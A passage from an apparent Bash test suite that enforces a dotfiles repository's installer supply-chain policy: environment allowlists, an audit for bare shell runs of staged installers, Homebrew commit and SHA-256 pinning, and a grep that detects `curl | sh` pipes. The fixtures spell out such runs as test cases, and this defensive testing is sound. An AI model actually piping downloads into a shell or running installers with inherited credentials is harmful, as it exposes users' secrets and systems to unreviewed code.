  widened="$(widened_fetch_library "${added// /-}")"
  sed "s/^  all_proxy ALL_PROXY SSL_CERT_FILE SSL_CERT_DIR CURL_CA_BUNDLE\$/& $added/" \
    "$repo_root/common/lib/fetch.sh" >"$widened"
  ! cmp -s "$repo_root/common/lib/fetch.sh" "$widened" ||
    _test_die 'the widened fetch.sh fixture no longer finds the end of the allowlist'
  widened_problems="$(installer_environment_problems "$widened")"
  assert_contains "$widened_problems" "is not the reviewed list:"
  assert_contains "$widened_problems" " ${added##* } "
  [[ "$added" == NODE_OPTIONS ]] ||
    assert_contains "$widened_problems" "hands a staged installer ${added##* }"
done
# A name appended later in the file, not in the literal, is the array too.
widened="$(widened_fetch_library appended)"
printf '\nDOTFILES_INSTALLER_ENVIRONMENT+=(GITHUB_TOKEN)\n' |
  cat "$repo_root/common/lib/fetch.sh" - >"$widened"
assert_contains "$(installer_environment_problems "$widened")" \
  'hands a staged installer GITHUB_TOKEN'
# And the unchanged library, copied the same way, has nothing wrong with it:
# the rejections above are the additions, not the copying.
unchanged="$(widened_fetch_library unchanged)"
cp "$repo_root/common/lib/fetch.sh" "$unchanged"
assert_eq '' "$(installer_environment_problems "$unchanged")" \
  'an unchanged copy of common/lib/fetch.sh'
printf 'PASS: a widened installer allowlist is rejected, credential-shaped or not\n'

# Every place a staged remote installer is executed goes through that runner.
# A bare `sh "$installer"` hands the script every variable the caller has.
#
# This used to look only for variables named *installer* or *staged*, so the
# same bare run of `"$no_mistakes_payload"` passed (issue #537, V5-24). The
# name says nothing about what the file is, so every sh or bash (dash, or any
# of them by absolute path) given an expansion to run, as a file, a -c string
# or stdin, is reported unless it is part of a fetch_run_installer or `env -i`
# command -- the same simple command, not merely the same line -- or the line
# above it carries `# not-a-staged-installer: <why>`. Read through the shared
# reader, so a comment is not a run, and a quoted script's text is not one
# either; a backslash-newline continues the command. `sh -c 'script' NAME` is
# the script's $0, and -n parses without running.
#
# unwrapped_shell_runs <tree> <directory>...: each such run under the given
# directories of <tree>, as path:line: command.
unwrapped_shell_runs() {
  PYTHONPATH="$repo_root/scripts/lib" python3 - "$@" <<'PYTHON'
import pathlib
import re
import sys

from shell import UnreadableShell, blank_text, code_text

SHELL = r"(?:(?:/usr)?/bin/)?(?:ba|da)?sh"
RUN = re.compile(rf"(?<![\w./-])(?P<shell>{SHELL})(?P<options>(?:\s+[-+][-\w]*)*)\s+(?=\S)")
STRING = r"(?:'[^']*'|\"[^\"]*\"|\S+)"
DOLLAR_ZERO = re.compile(rf"(?<![\w./-]){SHELL}(?:\s+[-+]\w+)*\s+-c\s+{STRING}\s+$")
WRAPPER = re.compile(r"(?<![\w-])(?:fetch_run_installer|env\s+-i)(?![\w-])")
MARKER = re.compile(r"^\s*# not-a-staged-installer: \S")
EXPANSION = re.compile(r'(?:<\s*)?"?\$')


def is_shell(path: pathlib.Path) -> bool:
    if path.suffix == ".sh":
        return True
    if path.suffix or not path.is_file():
        return False
    with path.open("rb") as handle:
        first = handle.readline()
    return first.startswith(b"#!") and re.search(rb"\b(ba|da)?sh\b", first) is not None


def runs(tree: pathlib.Path, path: pathlib.Path):
    text = path.read_text()
    raw_lines = text.splitlines()
    # Both views keep every character where it was, so a run found in the
    # blanked line is read back from the code line at the same offset.
    blank_lines = blank_text(text).split("\n")
    code_lines = code_text(text).split("\n")
    code_lines += [""] * (len(blank_lines) - len(code_lines))
    if any(len(b) != len(c) for b, c in zip(blank_lines, code_lines)):
        raise UnreadableShell(f"{path}: the blanked and code views disagree")
    number = 0
    while number < len(blank_lines):
        first = number
        blank_command = code_command = ""
        while True:
            blank, code = blank_lines[number], code_lines[number]
            number += 1
            if blank.endswith("\\") and number < len(blank_lines):
                blank_command += blank[:-1] + " "
                code_command += code[:-1] + " "
                continue
            blank_command += blank
            code_command += code
            break
        for match in RUN.finditer(blank_command):
            if not EXPANSION.match(code_command, match.end()):
                continue
            if any(re.fullmatch(r"-\w*n\w*", option) for option in match.group("options").split()):
                continue
            before = blank_command[: match.start()]
            if DOLLAR_ZERO.search(before):
                continue
            wrapper = None
            for wrapper in WRAPPER.finditer(before):
                pass
            if wrapper is not None and not re.search(r"[;&|]", before[wrapper.end():]):
                continue
            if first > 0 and MARKER.match(raw_lines[first - 1]):
                continue
            yield f"{path.relative_to(tree)}:{first + 1}: {' '.join(code_command.split())}"


tree = pathlib.Path(sys.argv[1])
for directory in sys.argv[2:]:
    for path in sorted((tree / directory).rglob("*")):
        if is_shell(path):
            for run in runs(tree, path):
                print(run)
PYTHON
}

unwrapped_runs="$(unwrapped_shell_runs "$repo_root" common scripts platforms)" ||
  _test_die 'the staged-installer audit could not read the tree'
if [[ -n "$unwrapped_runs" ]]; then
  printf 'A staged installer runs with the caller'"'"'s whole environment:\n%s\n' \
    "$unwrapped_runs" >&2
  exit 1
fi

# The audit has to report a bare run whatever the variable is called and
# however the command is spelled, and still let the wrapped and annotated
# shapes through. Each case is appended to a copy of common/install-ai.sh.
runs_tree="$test_root/unwrapped-runs"
mkdir -p "$runs_tree/common"
# unwrapped_run_case <expected: reported|clean> <shell text>
unwrapped_run_case() {
  local found
  {
    cat "$repo_root/common/install-ai.sh"
    printf '\nno_mistakes_payload="$HOME/.cache/no-mistakes-postinstall.sh"\n%s\n' "$2"
  } >"$runs_tree/common/install-ai.sh"
  found="$(unwrapped_shell_runs "$runs_tree" common)" ||
    _test_die "the staged-installer audit could not read: $2"
  if [[ "$1" == reported ]]; then
    [[ "$found" == *'common/install-ai.sh:'* ]] ||
      _test_die "a bare installer run was not reported: $2"
  else
    assert_eq '' "$found" "a run the audit must accept: $2"
  fi
}
# shellcheck disable=SC2016 # Shell text for the fixture, not for this shell.
{
  unwrapped_run_case reported 'sh "$no_mistakes_payload"'
  unwrapped_run_case reported 'bash -- "${no_mistakes_payload}"'
  unwrapped_run_case reported '/bin/sh $no_mistakes_payload'
  unwrapped_run_case reported $'bash \\\n  "$no_mistakes_payload"'
  unwrapped_run_case reported 'sh <"$no_mistakes_payload"'
  unwrapped_run_case reported 'bash -c "$(cat "$no_mistakes_payload")"'
  unwrapped_run_case reported 'fetch_run_installer -- true && sh "$no_mistakes_payload"'
  unwrapped_run_case reported $'# not-a-staged-installer:\nsh "$no_mistakes_payload"'
  unwrapped_run_case clean '# sh "$no_mistakes_payload" would hand it everything'
  unwrapped_run_case clean 'fetch_run_installer HOME="$HOME" -- sh "$no_mistakes_payload"'
  unwrapped_run_case clean $'fetch_run_installer \\\n  -- sh "$no_mistakes_payload"'
  unwrapped_run_case clean 'env -i PATH="$PATH" /bin/bash "$no_mistakes_payload"'
  unwrapped_run_case clean 'sh -c '"'"'command -v "$1"'"'"' sh "$no_mistakes_payload"'
  unwrapped_run_case clean 'bash -n "$no_mistakes_payload"'
  unwrapped_run_case clean $'# not-a-staged-installer: fixture\nsh "$no_mistakes_payload"'
}
printf 'PASS: every staged installer runs through the minimal-environment runner\n'

# scripts/bootstrap-macos.sh runs under Apple's Bash 3.2 before any library
# exists, so it spells the list out. The two lists must not drift apart.
library_names="$(bash -c 'source "$1/common/lib/fetch.sh"; printf "%s\n" "${DOTFILES_INSTALLER_ENVIRONMENT[@]}"' _ "$repo_root")"
bootstrap_function="$(sed -n '/^run_homebrew_installer() {$/,/^}$/p' "$repo_root/scripts/bootstrap-macos.sh")"
[[ -n "$bootstrap_function" ]] ||
  _test_die 'scripts/bootstrap-macos.sh no longer defines run_homebrew_installer'
bootstrap_names="$(sed -n '/for name in/,/; do/p' <<<"$bootstrap_function" |
  sed -e 's/for name in//' -e 's/; do//' -e 's/\\//g' | tr -s '[:space:]' '\n' | sed '/^$/d')"
assert_eq "$library_names" "$bootstrap_names" \
  'the Homebrew bootstrap and common/lib/fetch.sh must allowlist the same names'

# And the bootstrap function behaves like the library, run from its real text.
bootstrap_probe="$test_root/bootstrap-probe"
mkdir -p "$bootstrap_probe"
printf '#!/bin/bash\nenv | sort >"$HOME/report"\n' >"$bootstrap_probe/installer"
env -i HOME="$bootstrap_probe" PATH="$PATH" GITHUB_TOKEN=fixture-not-a-credential \
  ANTHROPIC_API_KEY=fixture-not-an-api-key \
  bash -c "set -e; $bootstrap_function"'
run_homebrew_installer "$1" true' _ "$bootstrap_probe/installer"
bootstrap_report="$(cut -d= -f1 <"$bootstrap_probe/report" | tr '\n' ' ')"
[[ " $bootstrap_report " != *" GITHUB_TOKEN "* && " $bootstrap_report " != *" ANTHROPIC_API_KEY "* ]] ||
  _test_die "the Homebrew bootstrap installer inherited a credential: $bootstrap_report"
[[ " $bootstrap_report " == *" NONINTERACTIVE "* && " $bootstrap_report " == *" HOME "* ]] ||
  _test_die "the Homebrew bootstrap installer lost a stated input: $bootstrap_report"
printf 'PASS: the Apple Bash 3.2 Homebrew bootstrap uses the same allowlist\n'

# --- The Homebrew installer is pinned and checked before it runs (#504) -----

homebrew_lib="$repo_root/platforms/macos/lib/homebrew-installer.sh"
homebrew_url="$(bash -c 'source "$1"; homebrew_installer_url' _ "$homebrew_lib")"
homebrew_commit="$(bash -c 'source "$1"; printf %s "$DOTFILES_HOMEBREW_INSTALLER_COMMIT"' _ "$homebrew_lib")"
[[ "$homebrew_commit" =~ ^[0-9a-f]{40}$ ]] ||
  _test_die "the Homebrew installer is not pinned to a full commit: $homebrew_commit"
assert_eq "https://raw.githubusercontent.com/Homebrew/install/$homebrew_commit/install.sh" \
  "$homebrew_url" 'the Homebrew installer must be fetched at the pinned commit'
if grep -rFq 'Homebrew/install/HEAD' "$repo_root/scripts" "$repo_root/platforms"; then
  _test_die 'an installer still fetches the moving HEAD of Homebrew/install'
fi

# The Bash 3.2 check itself: the pinned bytes pass, any other bytes fail and
# say so. The expected digest is read at call time, so the case can name the
# fixture's own digest as the pin without touching the tracked value.
# The library runs on macOS, where shasum is part of the system. Linux
# runners may lack it (the Fedora CI container does), so there a shim with
# the one call shape the library uses stands in for it.
homebrew_path="$PATH"
if ! command -v shasum >/dev/null 2>&1; then
  mkdir -p "$test_root/shasum-bin"
  printf '%s\n' '#!/bin/bash' \
    '[[ "$1" == -a && "$2" == 256 && $# -eq 3 ]] || exit 2' \
    'exec sha256sum -- "$3"' >"$test_root/shasum-bin/shasum"
  chmod +x "$test_root/shasum-bin/shasum"
  homebrew_path="$test_root/shasum-bin:$PATH"
fi
homebrew_fixture="$test_root/homebrew-install.sh"
printf '#!/bin/bash\necho reviewed\n' >"$homebrew_fixture"
homebrew_fixture_digest="$(sha256sum "$homebrew_fixture" | cut -d' ' -f1)"
PATH="$homebrew_path" bash -c 'source "$1"; DOTFILES_HOMEBREW_INSTALLER_SHA256="$2"; homebrew_installer_verify "$3"' \
  _ "$homebrew_lib" "$homebrew_fixture_digest" "$homebrew_fixture" ||
  _test_die 'the pinned Homebrew installer content was refused'
printf '#!/bin/bash\necho tampered\n' >"$homebrew_fixture"
if homebrew_output="$(PATH="$homebrew_path" bash -c 'source "$1"; DOTFILES_HOMEBREW_INSTALLER_SHA256="$2"; homebrew_installer_verify "$3"' \
  _ "$homebrew_lib" "$homebrew_fixture_digest" "$homebrew_fixture" 2>&1)"; then
  _test_die 'a Homebrew installer that differs from its pin was accepted'
fi
assert_contains "$homebrew_output" 'SHA-256 mismatch for the Homebrew installer'

# Both consumers check the pin before the line that runs the script.
line_of() { grep -nF -- "$2" "$1" | head -n1 | cut -d: -f1; }
bootstrap="$repo_root/scripts/bootstrap-macos.sh"
system_installer="$repo_root/platforms/macos/scripts/install-system.sh"
[[ -n "$(line_of "$bootstrap" 'homebrew_installer_verify "$installer"')" &&
  "$(line_of "$bootstrap" 'homebrew_installer_verify "$installer"')" -lt \
  "$(line_of "$bootstrap" 'run_homebrew_installer "$installer"')" ]] ||
  _test_die 'scripts/bootstrap-macos.sh must verify the Homebrew installer before running it'
[[ -n "$(line_of "$system_installer" 'fetch_verify_sha256 "$installer" "$DOTFILES_HOMEBREW_INSTALLER_SHA256"')" &&
  "$(line_of "$system_installer" 'fetch_verify_sha256 "$installer" "$DOTFILES_HOMEBREW_INSTALLER_SHA256"')" -lt \
  "$(line_of "$system_installer" 'fetch_run_installer NONINTERACTIVE=1')" ]] ||
  _test_die 'the macOS system installer must verify the Homebrew installer before running it'
printf 'PASS: the Homebrew installer is fetched at its pinned commit and refused unless it matches\n'

# --- No installer pipes remote content into a shell -------------------------

piped_downloads="$(grep -rnE 'curl[^|]*\|[[:space:]]*(sudo[[:space:]]+)?(ba)?sh' \
  "$repo_root/common" "$repo_root/scripts" "$repo_root/platforms" 2>/dev/null |
  grep -vE ':[[:space:]]*#' || true)"
if [[ -n "$piped_downloads" ]]; then
  printf 'An installer still pipes a download into a shell:\n%s\n' \
    "$piped_downloads" >&2
  exit 1
fi
printf 'PASS: no installer pipes a download straight into a shell\n'

printf 'Supply-chain policy tests passed.\n'
